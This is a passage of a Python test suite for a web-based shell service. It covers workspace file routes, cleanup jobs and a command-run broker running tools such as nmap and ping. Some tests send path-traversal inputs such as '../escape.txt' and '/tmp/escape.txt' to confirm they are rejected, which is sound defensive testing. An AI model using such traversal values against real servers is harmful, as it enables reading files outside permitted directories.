    def test_workspace_file_routes_include_and_maintain_generic_metadata(self):
        client = get_client()
        session = "workspace-metadata-" + uuid.uuid4().hex[:8]
        with tempfile.TemporaryDirectory() as tmp, mock.patch.dict(config.CFG, self._cfg(tmp)):
            created = client.post(
                "/workspace/files",
                headers={"X-Session-ID": session},
                json={"path": "targets.txt", "text": "darklab.sh\n"},
            )
            assert created.status_code == 200
            with sqlite3.connect(DB_PATH) as conn:
                conn.execute(
                    "INSERT INTO entity_labels "
                    "(id, session_id, entity_type, entity_id, label, created) "
                    "VALUES (?, ?, 'workspace_file', 'targets.txt', 'important', datetime('now'))",
                    ("lbl_workspace_file_" + uuid.uuid4().hex, session),
                )
                conn.execute(
                    "INSERT INTO entity_notes "
                    "(id, session_id, entity_type, entity_id, body, created, updated) "
                    "VALUES (?, ?, 'workspace_file', 'targets.txt', 'manual context', datetime('now'), datetime('now'))",
                    ("note_workspace_file_" + uuid.uuid4().hex, session),
                )
                conn.commit()

            listed = client.get("/workspace/files", headers={"X-Session-ID": session})
            assert listed.status_code == 200
            listed_file = listed.get_json()["files"][0]
            assert listed_file["path"] == "targets.txt"
            assert [label["label"] for label in listed_file["labels"]] == ["important"]
            assert listed_file["note"]["body"] == "manual context"

            read = client.get(
                "/workspace/files/read?path=targets.txt",
                headers={"X-Session-ID": session},
            )
            assert read.status_code == 200
            assert [label["label"] for label in read.get_json()["labels"]] == ["important"]
            assert read.get_json()["note"]["body"] == "manual context"

            created_dir = client.post(
                "/workspace/directories",
                headers={"X-Session-ID": session},
                json={"path": "reports"},
            )
            assert created_dir.status_code == 200
            moved = client.post(
                "/workspace/files/move",
                headers={"X-Session-ID": session},
                json={"source": "targets.txt", "destination": "reports/targets.txt"},
            )
            assert moved.status_code == 200
            with sqlite3.connect(DB_PATH) as conn:
                assert conn.execute(
                    "SELECT COUNT(*) FROM entity_labels "
                    "WHERE session_id = ? AND entity_type = 'workspace_file' AND entity_id = 'targets.txt'",
                    (session,),
                ).fetchone()[0] == 0
                assert conn.execute(
                    "SELECT body FROM entity_notes "
                    "WHERE session_id = ? AND entity_type = 'workspace_file' "
                    "AND entity_id = 'reports/targets.txt'",
                    (session,),
                ).fetchone()[0] == "manual context"

            deleted = client.delete(
                "/workspace/files?path=reports/targets.txt",
                headers={"X-Session-ID": session},
            )
            assert deleted.status_code == 200
            with sqlite3.connect(DB_PATH) as conn:
                assert conn.execute(
                    "SELECT COUNT(*) FROM entity_labels "
                    "WHERE session_id = ? AND entity_type = 'workspace_file'",
                    (session,),
                ).fetchone()[0] == 0
                assert conn.execute(
                    "SELECT COUNT(*) FROM entity_notes "
                    "WHERE session_id = ? AND entity_type = 'workspace_file'",
                    (session,),
                ).fetchone()[0] == 0

    def test_create_directory_lists_empty_folder(self):
        client = get_client()
        session = "workspace-dir-" + uuid.uuid4().hex[:8]
        directory_path = f"reports/{session}/empty"
        with tempfile.TemporaryDirectory() as tmp, mock.patch.dict(config.CFG, self._cfg(tmp)):
            created = client.post(
                "/workspace/directories",
                headers={"X-Session-ID": session},
                json={"path": directory_path},
            )
            assert created.status_code == 200
            created_data = created.get_json()
            assert created_data["directory"] == {"path": directory_path}
            assert {"reports", f"reports/{session}", directory_path} <= {
                item["path"] for item in created_data["workspace"]["directories"]
            }
            assert created_data["workspace"]["usage"]["file_count"] == 0

            listed = client.get("/workspace/files", headers={"X-Session-ID": session})
            assert listed.status_code == 200
            assert directory_path in {item["path"] for item in listed.get_json()["directories"]}
            audit_rows = _audit_event_rows(target_id=directory_path, event_type="file.write")
            assert len(audit_rows) == 1
            assert audit_rows[0]["details"] == {
                "source": "workspace",
                "action": "create_directory",
                "file_path": directory_path,
                "file_count": 0,
                "status": "directory",
            }

    def test_info_and_delete_folder_recursively(self):
        client = get_client()
        session = "workspace-delete-dir-" + uuid.uuid4().hex[:8]
        with tempfile.TemporaryDirectory() as tmp, mock.patch.dict(config.CFG, self._cfg(tmp)):
            client.post(
                "/workspace/files",
                headers={"X-Session-ID": session},
                json={"path": "reports/one.txt", "text": "one\n"},
            )
            client.post(
                "/workspace/files",
                headers={"X-Session-ID": session},
                json={"path": "reports/nested/two.txt", "text": "two\n"},
            )

            info = client.get(
                "/workspace/files/info?path=reports",
                headers={"X-Session-ID": session},
            )
            assert info.status_code == 200
            assert info.get_json() == {"path": "reports", "kind": "directory", "file_count": 2}

            deleted = client.delete(
                "/workspace/files?path=reports",
                headers={"X-Session-ID": session},
            )
            assert deleted.status_code == 200
            data = deleted.get_json()
            assert data["deleted"] == {"path": "reports", "kind": "directory", "file_count": 2}
            assert data["workspace"]["files"] == []
            assert data["workspace"]["directories"] == []

    def test_move_file_and_folder_paths(self):
        client = get_client()
        session = "workspace-move-" + uuid.uuid4().hex[:8]
        archive_path = f"archive-{session}"
        reports_path = f"reports-{session}"
        one_path = f"{reports_path}/one.txt"
        two_path = f"{reports_path}/nested/two.txt"
        moved_one_path = f"{archive_path}/one.txt"
        moved_reports_path = f"{archive_path}/reports-renamed"
        with tempfile.TemporaryDirectory() as tmp, mock.patch.dict(config.CFG, self._cfg(tmp)):
            client.post(
                "/workspace/directories",
                headers={"X-Session-ID": session},
                json={"path": archive_path},
            )
            client.post(
                "/workspace/files",
                headers={"X-Session-ID": session},
                json={"path": one_path, "text": "one\n"},
            )
            client.post(
                "/workspace/files",
                headers={"X-Session-ID": session},
                json={"path": two_path, "text": "two\n"},
            )

            moved_file = client.post(
                "/workspace/files/move",
                headers={"X-Session-ID": session},
                json={"source": one_path, "destination": archive_path},
            )
            assert moved_file.status_code == 200
            assert moved_file.get_json()["moved"] == {
                "source": one_path,
                "destination": moved_one_path,
                "kind": "file",
                "file_count": 1,
            }
            assert client.get(
                f"/workspace/files/read?path={one_path}",
                headers={"X-Session-ID": session},
            ).status_code == 404
            assert client.get(
                f"/workspace/files/read?path={moved_one_path}",
                headers={"X-Session-ID": session},
            ).get_json()["text"] == "one\n"
            file_move_audit = _audit_event_rows(target_id=moved_one_path, event_type="file.move")
            assert len(file_move_audit) == 1
            assert file_move_audit[0]["details"] == {
                "source": "workspace",
                "action": "move",
                "source_path": one_path,
                "destination_path": moved_one_path,
                "file_path": moved_one_path,
                "file_count": 1,
                "status": "file",
            }
            assert "one\\n" not in json.dumps(file_move_audit)

            moved_folder = client.post(
                "/workspace/files/move",
                headers={"X-Session-ID": session},
                json={"source": reports_path, "destination": moved_reports_path},
            )
            assert moved_folder.status_code == 200
            assert moved_folder.get_json()["moved"] == {
                "source": reports_path,
                "destination": moved_reports_path,
                "kind": "directory",
                "file_count": 1,
            }
            nested = client.get(
                f"/workspace/files/read?path={moved_reports_path}/nested/two.txt",
                headers={"X-Session-ID": session},
            )
            assert nested.status_code == 200
            assert nested.get_json()["text"] == "two\n"
            folder_move_audit = _audit_event_rows(target_id=moved_reports_path, event_type="file.move")
            assert len(folder_move_audit) == 1
            assert folder_move_audit[0]["details"]["source_path"] == reports_path
            assert folder_move_audit[0]["details"]["destination_path"] == moved_reports_path
            assert folder_move_audit[0]["details"]["file_count"] == 1
            assert folder_move_audit[0]["details"]["status"] == "directory"

            moved_to_root = client.post(
                "/workspace/files/move",
                headers={"X-Session-ID": session},
                json={"source": moved_one_path, "destination": "/"},
            )
            assert moved_to_root.status_code == 200
            assert moved_to_root.get_json()["moved"]["destination"] == "one.txt"

    def test_move_rejects_invalid_paths_and_recursive_folder_moves(self):
        client = get_client()
        session = "workspace-move-invalid-" + uuid.uuid4().hex[:8]
        with tempfile.TemporaryDirectory() as tmp, mock.patch.dict(config.CFG, self._cfg(tmp)):
            client.post(
                "/workspace/files",
                headers={"X-Session-ID": session},
                json={"path": "reports/one.txt", "text": "one\n"},
            )
            client.post(
                "/workspace/files",
                headers={"X-Session-ID": session},
                json={"path": "reports/nested/two.txt", "text": "two\n"},
            )

            cases = [
                {"source": "../escape.txt", "destination": "reports"},
                {"source": "reports/one.txt", "destination": "../escape.txt"},
                {"source": "reports/one.txt", "destination": "reports/nested/two.txt"},
                {"source": "reports", "destination": "reports/nested"},
            ]
            for payload in cases:
                resp = client.post(
                    "/workspace/files/move",
                    headers={"X-Session-ID": session},
                    json=payload,
                )
                assert resp.status_code == 400

            listed = client.get("/workspace/files", headers={"X-Session-ID": session})
            files = {item["path"] for item in listed.get_json()["files"]}
            assert files == {"reports/one.txt", "reports/nested/two.txt"}

    def test_rejects_unsafe_paths(self):
        client = get_client()
        session = "workspace-paths-" + uuid.uuid4().hex[:8]
        with tempfile.TemporaryDirectory() as tmp, mock.patch.dict(config.CFG, self._cfg(tmp)):
            for bad_path in (
                "../escape.txt",
                "/tmp/escape.txt",
                "a\\b.txt",
                " dataperk.com",
                "dataperk.com ",
                "\n  dataperk.com",
            ):
                resp = client.post(
                    "/workspace/files",
                    headers={"X-Session-ID": session},
                    json={"path": bad_path, "text": "x"},
                )
                assert resp.status_code == 400
                directory = client.post(
                    "/workspace/directories",
                    headers={"X-Session-ID": session},
                    json={"path": bad_path},
                )
                assert directory.status_code == 400

    def test_rejects_unsafe_paths_on_read_delete_and_download(self):
        client = get_client()
        session = "workspace-route-paths-" + uuid.uuid4().hex[:8]
        bad_paths = ("../escape.txt", "/tmp/escape.txt", "a\\b.txt")
        with tempfile.TemporaryDirectory() as tmp, mock.patch.dict(config.CFG, self._cfg(tmp)):
            for bad_path in bad_paths:
                encoded = quote(bad_path, safe="")
                read = client.get(
                    f"/workspace/files/read?path={encoded}",
                    headers={"X-Session-ID": session},
                )
                deleted = client.delete(
                    f"/workspace/files?path={encoded}",
                    headers={"X-Session-ID": session},
                )
                downloaded = client.get(
                    f"/workspace/files/download?path={encoded}",
                    headers={"X-Session-ID": session},
                )

                assert read.status_code == 400
                assert deleted.status_code == 400
                assert downloaded.status_code == 400

    def test_allows_hidden_workspace_paths_when_listed(self):
        client = get_client()
        session = "workspace-hidden-" + uuid.uuid4().hex[:8]
        with tempfile.TemporaryDirectory() as tmp, mock.patch.dict(config.CFG, self._cfg(tmp)):
            created = client.post(
                "/workspace/files",
                headers={"X-Session-ID": session},
                json={"path": ".config/amass.txt", "text": "hidden ok\n"},
            )
            listed = client.get("/workspace/files", headers={"X-Session-ID": session})
            read = client.get(
                "/workspace/files/read?path=.config%2Famass.txt",
                headers={"X-Session-ID": session},
            )

            assert created.status_code == 200
            assert listed.status_code == 200
            assert ".config/amass.txt" in {item["path"] for item in listed.get_json()["files"]}
            assert read.status_code == 200
            assert read.get_json()["text"] == "hidden ok\n"

    def test_enforces_quota_and_type_checks(self):
        client = get_client()
        session = "workspace-quota-" + uuid.uuid4().hex[:8]
        with tempfile.TemporaryDirectory() as tmp, mock.patch.dict(
            config.CFG,
            self._cfg(tmp, workspace_quota_mb=0, workspace_max_file_mb=0, workspace_max_files=1),
        ):
            non_object = client.post(
                "/workspace/files",
                headers={"X-Session-ID": session},
                data="not-json",
                content_type="text/plain",
            )
            assert non_object.status_code == 400

            non_text = client.post(
                "/workspace/files",
                headers={"X-Session-ID": session},
                json={"path": "targets.txt", "text": ["darklab.sh"]},
            )
            assert non_text.status_code == 400
            assert json.loads(non_text.data)["error"] == "text must be a string"

            too_big = client.post(
                "/workspace/files",
                headers={"X-Session-ID": session},
                json={"path": "targets.txt", "text": "x"},
            )
            assert too_big.status_code == 413

    def test_download_streams_session_owned_file(self):
        client = get_client()
        session = "workspace-download-" + uuid.uuid4().hex[:8]
        with tempfile.TemporaryDirectory() as tmp, mock.patch.dict(config.CFG, self._cfg(tmp)):
            client.post(
                "/workspace/files",
                headers={"X-Session-ID": session},
                json={"path": "notes/targets.txt", "text": "darklab.sh\n"},
            )
            resp = client.get(
                "/workspace/files/download?path=notes/targets.txt",
                headers={"X-Session-ID": session},
            )
            ticket_resp = client.post(
                "/workspace/files/download-ticket",
                headers={"X-Session-ID": session},
                json={"path": "notes/targets.txt"},
            )
            ticket_download = client.get(ticket_resp.get_json()["url"])
        assert resp.status_code == 200
        assert resp.get_data(as_text=True) == "darklab.sh\n"
        assert resp.headers["Content-Length"] == "11"
        assert "attachment" in resp.headers["Content-Disposition"]
        assert "targets.txt" in resp.headers["Content-Disposition"]
        assert ticket_resp.status_code == 200
        assert ticket_download.status_code == 200
        assert ticket_download.get_data(as_text=True) == "darklab.sh\n"
        assert ticket_download.headers["Content-Length"] == "11"

    def test_file_list_includes_project_artifact_metadata(self):
        client = get_client()
        session = "workspace-artifacts-" + uuid.uuid4().hex[:8]
        run_id = "run-" + uuid.uuid4().hex[:8]
        project_id = "prj_" + uuid.uuid4().hex[:16]
        with tempfile.TemporaryDirectory() as tmp, mock.patch.dict(config.CFG, self._cfg(tmp)):
            client.post(
                "/workspace/files",
                headers={"X-Session-ID": session},
                json={"path": "reports/targets.txt", "text": "darklab.sh\n"},
            )
            with sqlite3.connect(DB_PATH) as conn:
                conn.execute(
                    "INSERT INTO runs (id, session_id, command, started) VALUES (?, ?, 'cat reports/targets.txt', ?)",
                    (run_id, session, datetime.now(timezone.utc).isoformat()),
                )
                conn.execute(
                    "INSERT INTO projects "
                    "(id, session_id, name, slug, description, status, color, created, updated) "
                    "VALUES (?, ?, 'Artifact Case', ?, '', 'active', '', datetime('now'), datetime('now'))",
                    (project_id, session, f"artifact-case-{uuid.uuid4().hex[:8]}"),
                )
                conn.execute(
                    "INSERT INTO project_links (id, project_id, entity_type, entity_id, source, created) "
                    "VALUES (?, ?, 'run', ?, 'manual', datetime('now'))",
                    ("pln_" + uuid.uuid4().hex[:16], project_id, run_id),
                )
                conn.execute(
                    "INSERT INTO run_file_artifacts "
                    "(id, session_id, run_id, workspace_path, display_name, kind, byte_size, detected_by, created) "
                    "VALUES (?, ?, ?, 'reports/targets.txt', 'targets.txt', 'output', 11, 'workspace_flag', "
                    "datetime('now'))",
                    ("rfa_" + uuid.uuid4().hex[:16], session, run_id),
                )
                conn.commit()
            resp = client.get("/workspace/files", headers={"X-Session-ID": session})
        data = json.loads(resp.data)
        file_row = next(item for item in data["files"] if item["path"] == "reports/targets.txt")
        assert file_row["artifact_count"] == 1
        assert file_row["artifact_run_count"] == 1
        assert file_row["project_names"] == ["Artifact Case"]

    def test_periodic_cleanup_runs_before_requests_when_workspace_enabled(self):
        client = get_client()
        previous_cleanup = shell_app._last_workspace_cleanup_monotonic
        try:
            shell_app._last_workspace_cleanup_monotonic = 0
            with tempfile.TemporaryDirectory() as tmp, mock.patch.dict(config.CFG, self._cfg(tmp)):
                from services.workspace.files import ensure_session_workspace
                expired_root = ensure_session_workspace("expired-session", config.CFG)
                os.utime(expired_root, (1000, 1000))

                with mock.patch("app.time.monotonic", return_value=1000):
                    resp = client.get("/health")

                assert resp.status_code == 200
                assert not expired_root.exists()
        finally:
            shell_app._last_workspace_cleanup_monotonic = previous_cleanup

    def test_periodic_cleanup_skips_request_session_workspace(self):
        client = get_client()
        previous_cleanup = shell_app._last_workspace_cleanup_monotonic
        try:
            shell_app._last_workspace_cleanup_monotonic = 0
            with tempfile.TemporaryDirectory() as tmp, mock.patch.dict(config.CFG, self._cfg(tmp)):
                from services.workspace.files import ensure_session_workspace
                current_root = ensure_session_workspace("active-session", config.CFG)
                expired_root = ensure_session_workspace("expired-session", config.CFG)
                os.utime(current_root, (1000, 1000))
                os.utime(expired_root, (1000, 1000))

                with mock.patch("app.time.monotonic", return_value=1000):
                    resp = client.get("/health", headers={"X-Session-ID": "active-session"})

                assert resp.status_code == 200
                assert current_root.exists()
                assert not expired_root.exists()
        finally:
            shell_app._last_workspace_cleanup_monotonic = previous_cleanup

    def test_periodic_sqlite_wal_checkpoint_runs_before_requests(self):
        client = get_client()
        previous_checkpoint = shell_app._last_sqlite_wal_checkpoint_monotonic
        fake_conn = mock.MagicMock()
        fake_conn.__enter__.return_value = fake_conn
        fake_conn.__exit__.return_value = None
        fake_conn.execute.return_value.fetchone.return_value = (0, 12, 12)
        try:
            shell_app._last_sqlite_wal_checkpoint_monotonic = 0
            with mock.patch.object(shell_app, "DB_BACKEND", DatabaseBackend.SQLITE), \
                 mock.patch.object(shell_app, "db_connect", return_value=fake_conn) as connect_db, \
                 mock.patch.object(shell_app, "_sqlite_wal_checkpoint_monotonic", return_value=1000), \
                 mock.patch.object(shell_app.log, "info") as log_info:
                resp = client.get("/health")

            assert resp.status_code == 200
            connect_db.assert_called_once_with()
            fake_conn.execute.assert_called_once_with("PRAGMA wal_checkpoint(TRUNCATE)")
            log_info.assert_any_call("SQLITE_WAL_CHECKPOINT", extra={
                "busy": 0,
                "log_frames": 12,
                "checkpointed_frames": 12,
            })
        finally:
            shell_app._last_sqlite_wal_checkpoint_monotonic = previous_checkpoint


# ── /runs ─────────────────────────────────────────────────────────────────────

class TestRunRoute:
    def test_workspace_path_output_filter_masks_absolute_session_paths(self):
        from blueprints.run import _WorkspacePathOutputFilter

        with tempfile.TemporaryDirectory() as tmp:
            cfg = TestWorkspaceRoutes()._cfg(tmp)
            session = "workspace-filter-" + uuid.uuid4().hex[:8]
            workspace_path = workspace_files.session_workspace_dir(session, cfg)
            output_filter = _WorkspacePathOutputFilter(session, cfg)

            filtered = output_filter.process_output_line(
                f"wrote {workspace_path}/reports/nmap.xml and {workspace_path}"
            )

        assert filtered == "wrote /reports/nmap.xml and /"

    def test_brokered_run_requires_available_broker(self):
        client = get_client()
        with mock.patch("blueprints.run.broker_available", return_value=False), \
             mock.patch("blueprints.run.broker_unavailable_reason", return_value="broker unavailable"):
            resp = client.post("/runs", json={"command": "echo hi"})
        assert resp.status_code == 503
        assert json.loads(resp.data)["error"] == "broker unavailable"

    def test_brokered_run_missing_runtime_returns_synthetic_stream_reference(self):
        client = get_client()
        with mock.patch("blueprints.run.broker_available", return_value=True), \
             mock.patch("blueprints.run.is_command_allowed", return_value=(True, "")), \
             mock.patch("blueprints.run.rewrite_command", return_value=("nmap -sV darklab.sh", None)), \
             mock.patch("blueprints.run.runtime_missing_command_name", return_value="nmap"), \
             mock.patch("blueprints.run._brokered_synthetic_run", return_value="run-missing") as synthetic, \
             mock.patch("blueprints.run.subprocess.Popen") as popen:
            resp = client.post(
                "/runs",
                json={"command": "nmap -sV darklab.sh"},
                headers={"X-Session-ID": "session-1"},
            )
        assert resp.status_code == 202
        assert json.loads(resp.data) == {
            "run_id": "run-missing",
            "stream": "/runs/run-missing/stream",
        }
        synthetic.assert_called_once()
        args = synthetic.call_args.args
        assert args[0] == "nmap -sV darklab.sh"
        assert args[3] == [{"type": "output", "text": "Command is not installed on this instance: nmap"}]
        assert args[4] == 127
        assert synthetic.call_args.kwargs == {"cmd_type": "missing", "owner_tab_id": ""}
        popen.assert_not_called()

    def test_brokered_run_rejects_invalid_command_payloads(self):
        client = get_client()
        with mock.patch("blueprints.run.broker_available", return_value=True):
            non_object = client.post("/runs", json=["hostname"])
            missing = client.post("/runs", json={})
            non_string = client.post("/runs", json={"command": 42})
            blank = client.post("/runs", json={"command": "   "})

        assert non_object.status_code == 400
        assert json.loads(non_object.data) == {"error": "Request body must be a JSON object"}
        assert missing.status_code == 400
        assert json.loads(missing.data) == {"error": "No command provided"}
        assert non_string.status_code == 400
        assert json.loads(non_string.data) == {"error": "Command must be a string"}
        assert blank.status_code == 400
        assert json.loads(blank.data) == {"error": "No command provided"}

    def test_brokered_run_disallowed_command_returns_403_before_spawning(self):
        client = get_client()
        with mock.patch("blueprints.run.broker_available", return_value=True), \
             mock.patch("blueprints.run.is_command_allowed", return_value=(False, "blocked")), \
             mock.patch("blueprints.run.subprocess.Popen") as popen:
            resp = client.post("/runs", json={"command": "nmap -sS 127.0.0.1"})

        assert resp.status_code == 403
        assert json.loads(resp.data) == {"error": "blocked"}
        popen.assert_not_called()

    def test_brokered_run_starts_real_process_and_registers_active_run(self):
        client = get_client()
        fake_proc = _RouteFakeProc(pid=8765)
        _CapturedThread.instances = []

        with mock.patch("blueprints.run.broker_available", return_value=True), \
             mock.patch("blueprints.run.is_command_allowed", return_value=(True, "")), \
             mock.patch("blueprints.run.rewrite_command", return_value=("ping darklab.sh", "rewritten")), \
             mock.patch("blueprints.run.runtime_missing_command_name", return_value=None), \
             mock.patch("blueprints.run.subprocess.Popen", return_value=fake_proc) as popen, \
             mock.patch("blueprints.run.pid_register") as pid_register, \
             mock.patch("blueprints.run.active_run_register") as active_register, \
             mock.patch("blueprints.run.publish_run_event") as publish, \
             mock.patch("blueprints.run.STDBUF_BIN", "/usr/bin/stdbuf"), \
             mock.patch("services.runs.start.threading", mock.Mock(Thread=_CapturedThread)), \
             mock.patch("blueprints.run.uuid.uuid4", return_value="run-real"):
            resp = client.post(
                "/runs",
                json={"command": "ping darklab.sh", "tab_id": "tab-1"},
                headers={"X-Session-ID": "session-1", "X-Client-ID": "client-1"},
            )

        assert resp.status_code == 202
        assert json.loads(resp.data) == {
            "run_id": "run-real",
            "stream": "/runs/run-real/stream",
        }
        launched = popen.call_args.args[0]
        assert launched[:3] == ["/usr/bin/stdbuf", "-oL", "-eL"]
        assert launched[-2:] == ["-c", "ping darklab.sh"]
        pid_register.assert_called_once_with("run-real", 8765)
        active_register.assert_called_once()
        assert active_register.call_args.args[:4] == (
            "run-real",
            8765,
            "session-1",
            "ping darklab.sh",
        )
        assert active_register.call_args.kwargs == {
            "owner_client_id": "client-1",
            "owner_tab_id": "tab-1",
        }
        publish.assert_called_once()
        assert publish.call_args.args[:2] == ("run-real", "started")
        assert publish.call_args.args[2]["run_id"] == "run-real"
        assert len(_CapturedThread.instances) == 1
        thread = _CapturedThread.instances[0]
        assert thread.started is True
        assert thread.daemon is True
        assert thread.name == "run-broker-run-real"
        assert thread.kwargs["run_id"] == "run-real"
        assert thread.kwargs["proc"] is fake_proc
        assert thread.kwargs["session_id"] == "session-1"
        assert thread.kwargs["original_command"] == "ping darklab.sh"
        assert thread.kwargs["rewrite_notice"] == "rewritten"

    def test_interactive_pty_start_persists_team_scope(self):
        client = get_client()
        team_scope = mock.Mock(team_id="team-1", is_team=True, member={"role": "operator"})
        fake_run = mock.Mock(run_id="pty-team-run", rows=24, cols=100)
        with mock.patch("blueprints.run.pty_enabled", return_value=True), \
             mock.patch("blueprints.run.pty_broker_available", return_value=True), \
             mock.patch("blueprints.run.current_request_scope", return_value=team_scope), \
             mock.patch(
                 "blueprints.run._prepare_interactive_pty_command",
                 return_value=(
                     ["mtr", "darklab.sh"],
                     "mtr --interactive darklab.sh",
                     {"allow_input": True},
                 ),
             ), \
             mock.patch("blueprints.run._active_interactive_pty_count", return_value=0), \
             mock.patch("blueprints.run._interactive_pty_concurrency_limit", return_value=4), \
             mock.patch("blueprints.run.start_pty_run", return_value=fake_run) as start:
            resp = client.post(
                "/pty/runs",
                headers={"X-Session-ID": "member-session", "X-Team-ID": "team-1"},
                json={"command": "mtr --interactive darklab.sh", "tab_id": "tab-1"},
            )

        assert resp.status_code == 202
        assert json.loads(resp.data)["run_id"] == "pty-team-run"
        assert start.call_args.kwargs["session_id"] == "member-session"
        assert start.call_args.kwargs["team_id"] == "team-1"

    def test_brokered_run_events_returns_session_scoped_backfill(self):
        client = get_client()
        fake_event = mock.Mock(event_id="10-0", payload={"type": "output", "text": "hello"})
        fake_event.as_payload.return_value = {"event_id": "10-0", "type": "output", "text": "hello"}
        with mock.patch("blueprints.run.active_runs_for_session", return_value=[{"run_id": "run-1"}]), \
             mock.patch("blueprints.run.get_run_events", return_value=[fake_event]) as get_events:
            resp = client.get(
                "/runs/run-1/events?after=9-0&limit=25",
                headers={"X-Session-ID": "session-1"},
            )
        assert resp.status_code == 200
        assert json.loads(resp.data) == {
            "run_id": "run-1",
            "events": [{"event_id": "10-0", "type": "output", "text": "hello"}],
        }
        get_events.assert_called_once_with("run-1", after_id="9-0", limit=25)

        team_scope = mock.Mock(team_id="team-1", is_team=True, member={"role": "viewer"})
        with mock.patch("blueprints.run.current_request_scope", return_value=team_scope), \
             mock.patch("blueprints.run.active_run_belongs_to_scope", return_value=False), \
             mock.patch("blueprints.run.active_runs_for_team", return_value=[{"run_id": "run-team"}]), \
             mock.patch("blueprints.run.get_run_events", return_value=[fake_event]) as team_get_events:
            team_resp = client.get(
                "/runs/run-team/events?after=9-0&limit=25",
                headers={"X-Session-ID": "member-session", "X-Team-ID": "team-1"},
            )

        assert team_resp.status_code == 200
        assert json.loads(team_resp.data)["events"] == [{"event_id": "10-0", "type": "output", "text": "hello"}]
        team_get_events.assert_called_once_with("run-team", after_id="9-0", limit=25)

    def test_brokered_run_events_rejects_runs_outside_session(self):
        client = get_client()
        with mock.patch("blueprints.run.active_runs_for_session", return_value=[]), \
             mock.patch("blueprints.run.get_run_events") as get_events:
            resp = client.get(
                "/runs/run-other/events",
                headers={"X-Session-ID": "session-1"},
            )

        assert resp.status_code == 404
        assert json.loads(resp.data) == {"error": "Run not found"}
        get_events.assert_not_called()

    def test_brokered_run_stream_replays_events_for_session_run(self):
        client = get_client()
        with mock.patch("blueprints.run.active_runs_for_session", return_value=[{"run_id": "run-1"}]), \
             mock.patch("blueprints.run.stream_run_events", return_value=iter(["data: one\n\n"])), \
             mock.patch("blueprints.run.active_run_touch_owner") as touch:
            resp = client.get(
                "/runs/run-1/stream?after=9-0&tab_id=tab-1",
                headers={"X-Session-ID": "session-1", "X-Client-ID": "client-1"},
            )
            body = resp.get_data(as_text=True)
        assert resp.status_code == 200
        assert body == "data: one\n\n"
        touch.assert_called_once_with("run-1", "client-1", "tab-1")

        team_scope = mock.Mock(team_id="team-1", is_team=True, member={"role": "viewer"})
        with mock.patch("blueprints.run.current_request_scope", return_value=team_scope), \
             mock.patch("blueprints.run.active_run_belongs_to_scope", return_value=False), \
             mock.patch("blueprints.run.active_runs_for_team", return_value=[{"run_id": "run-team"}]), \
             mock.patch("blueprints.run.stream_run_events", return_value=iter(["data: team\n\n"])), \
             mock.patch("blueprints.run.active_run_touch_owner") as team_touch:
            team_resp = client.get(
                "/runs/run-team/stream?after=9-0&tab_id=tab-1",
                headers={"X-Session-ID": "member-session", "X-Team-ID": "team-1", "X-Client-ID": "client-1"},
            )
            team_body = team_resp.get_data(as_text=True)

        assert team_resp.status_code == 200
        assert team_body == "data: team\n\n"
        team_touch.assert_called_once_with("run-team", "client-1", "tab-1")

    def test_brokered_run_stream_throttles_owner_liveness_refresh(self):
        client = get_client()
        events = ["data: one\n\n", "data: two\n\n", "data: three\n\n"]
        with mock.patch("blueprints.run.active_runs_for_session", return_value=[{"run_id": "run-1"}]), \
             mock.patch("blueprints.run.stream_run_events", return_value=iter(events)), \
             mock.patch("blueprints.run._active_run_owner_touch_monotonic", side_effect=[100.0, 101.0, 105.0]), \
             mock.patch("blueprints.run.active_run_touch_owner") as touch:
            resp = client.get(
                "/runs/run-1/stream?tab_id=tab-1",
                headers={"X-Session-ID": "session-1", "X-Client-ID": "client-1"},
            )
            body = resp.get_data(as_text=True)

        assert resp.status_code == 200
        assert body == "".join(events)
        assert touch.call_args_list == [
            mock.call("run-1", "client-1", "tab-1"),
            mock.call("run-1", "client-1", "tab-1"),
        ]

    def test_brokered_run_stream_allows_registered_run_that_exited_before_persistence(self):
        client = get_client()
        with mock.patch("blueprints.run.active_run_belongs_to_scope", return_value=True), \
             mock.patch("blueprints.run.active_runs_for_session") as active_runs, \
             mock.patch("blueprints.run.stream_run_events", return_value=iter(["data: fast-exit\n\n"])):
            resp = client.get(
                "/runs/run-fast/stream",
                headers={"X-Session-ID": "session-1"},
            )
            body = resp.get_data(as_text=True)

        assert resp.status_code == 200
        assert body == "data: fast-exit\n\n"
        active_runs.assert_not_called()

    def test_brokered_run_stream_rejects_runs_outside_session(self):
        client = get_client()
        with mock.patch("blueprints.run.active_runs_for_session", return_value=[]), \
             mock.patch("blueprints.run.stream_run_events") as stream_events, \
             mock.patch("blueprints.run.log.warning") as warn:
            resp = client.get(
                "/runs/run-other/stream",
                headers={"X-Session-ID": "session-1", "X-Client-ID": "client-1"},
            )

        assert resp.status_code == 404
        assert json.loads(resp.data) == {"error": "Run not found"}
        stream_events.assert_not_called()
        warn.assert_called_once()
        assert warn.call_args.args[0] == "RUN_BROKER_STREAM_MISS"
        extra = warn.call_args.kwargs["extra"]
        assert extra["run_id"] == "run-other"
        assert extra["active_match"] is False
        assert extra["db_match"] is False

    def test_brokered_run_events_and_stream_report_scope_mismatch(self):
        client = get_client()
        active_sequences = [
            [],
            [{"run_id": "run-team-scope", "team_id": "team_scope"}],
            [],
            [{"run_id": "run-team-scope", "team_id": "team_scope"}],
        ]
        with mock.patch("blueprints.run.active_runs_for_session", side_effect=active_sequences), \
             mock.patch("blueprints.run.get_run_events") as get_events, \
             mock.patch("blueprints.run.stream_run_events") as stream_events, \
             mock.patch("blueprints.run.log.warning") as warn:
            events_resp = client.get(
                "/runs/run-team-scope/events",
                headers={"X-Session-ID": "session-1"},
            )
            stream_resp = client.get(
                "/runs/run-team-scope/stream",
                headers={"X-Session-ID": "session-1"},
            )

        expected = {
            "error": "run_scope_mismatch",
            "message": "Run exists in a different team scope. Switch to that team scope to view it.",
            "scope": "team",
            "team_id": "team_scope",
        }
        assert events_resp.status_code == 409
        assert stream_resp.status_code == 409
        assert json.loads(events_resp.data) == expected
        assert json.loads(stream_resp.data) == expected
        get_events.assert_not_called()
        stream_events.assert_not_called()
        extra = warn.call_args.kwargs["extra"]
        assert extra["scope_mismatch"] is True
        assert extra["actual_team_id"] == "team_scope"

    def test_brokered_run_owner_takeover_route_is_retired(self):
        client = get_client()
        resp = client.post(
            "/runs/run-1/owner",
            headers={"X-Session-ID": "session-1", "X-Client-ID": "client-2"},
            json={"tab_id": "tab-2"},
        )
        assert resp.status_code == 404

    def test_kill_allows_same_session_attached_client_and_publishes_killer(self):
        client = get_client()
        with mock.patch("blueprints.run.pid_for_session", return_value=4321) as pid_lookup, \
             mock.patch("blueprints.run.publish_run_event") as publish, \
